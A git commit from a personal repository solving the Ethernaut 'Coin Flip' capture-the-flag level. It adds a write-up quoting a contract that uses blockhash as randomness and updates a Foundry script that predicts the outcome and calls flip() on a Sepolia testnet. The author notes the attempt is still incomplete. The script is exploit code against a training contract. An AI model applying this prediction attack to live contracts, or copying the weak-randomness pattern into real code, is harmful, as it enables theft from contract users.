45e211b8a282449eb260604c644c2912b7b29071
imagobea <himagobea@gmail.com>
2024-03-12 09:50:08 +0100

    chore: eth 03, wrap up

---
+++ script/ethernaut/03-coinflip/CoinFlip.md
@@ -0,0 +1,58 @@
+# Coin Flip
+
+## Smart Contract
+
+```sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+```
+
+Level address 
+`0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF`
+
+Level is complete upon 10 `consecutiveWins`
+(see [CoinFlipFactory](https://github.com/OpenZeppelin/ethernaut/blob/4d4c0a7fb969f69440153718d611b0c39b66a18c/contracts/contracts/levels/CoinFlipFactory.sol#L17))
+
+
+## What is the issue at hand
+
+Poor source of randomness, coin side can be guessed.
+
+## Status
+
+:red_circle: **Incomplete**. Sepolia is too busy, so by the time the transaction is broadcasted and mined, it goes into a different block (different block number than the one used to make the "flip guess").
+
+```bash
+forge script script/ethernaut/03-coinflip/CoinFlip.s.sol --rpc-url $RPC_ETH_TESTNET_SEPOLIA --broadcast -vvvv
+```
--- script/ethernaut/03-coinflip/CoinFlip.s.sol
+++ script/ethernaut/03-coinflip/CoinFlip.s.sol
@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import {Script, console2} from "forge-std/Script.sol";
+import {Script} from "forge-std/Script.sol";
 import {ICoinFlip} from "../../../src/ethernaut/03-coinflip/ICoinFlip.sol";
 
 contract CoinFlipScript is Script {
@@ -10,29 +10,26 @@ contract CoinFlipScript is Script {
     uint256 privateKey = vm.envUint("ACCOUNT_1_PRIVATE_KEY");
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
+    event CoinFlipped(uint256 blockNumber, bool coinSide, uint256 consecutiveWins);
+
     function run() public {
-        bool coinSide = _getCoinSide();
+        // Load contract at address
+        ICoinFlip coinflip = ICoinFlip(coinFlipInstanceAddress);
 
+        // Calculate in advance the side of the coin
+        uint256 consecutiveWins = coinflip.consecutiveWins();
+        uint256 blockNumber = vm.getBlockNumber();
+        bool coinSide = _getCoinSide(blockNumber);
+        emit CoinFlipped(blockNumber, coinSide, consecutiveWins);
+
+        // Call `flip()` passing the expected side
+        require(blockNumber == block.number, "New block!");
         vm.broadcast(privateKey);
-        bool result = _flip(coinSide);
-        if (!result) {
-            revert();
-        }
-    
-        console2.log("Coin: %s -v- Flip: %s (total wins %s)", coinSide, result, _consecutiveWins());
+        bool result = coinflip.flip(coinSide);
     }
 
-    function _getCoinSide() internal returns (bool) {
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-        uint256 coinFlip = blockValue / FACTOR;
+    function _getCoinSide(uint256 _blockNumber) internal returns (bool) {
+        uint256 coinFlip = uint256(blockhash(_blockNumber - 1)) / FACTOR;
         return coinFlip == 1;
-    }
-
-    function _flip(bool _educatedGuess) internal returns (bool) {
-        return ICoinFlip(coinFlipInstanceAddress).flip(_educatedGuess);
-    }
-
-    function _consecutiveWins() internal returns (uint256) {
-        return ICoinFlip(coinFlipInstanceAddress).consecutiveWins();
     }
 }
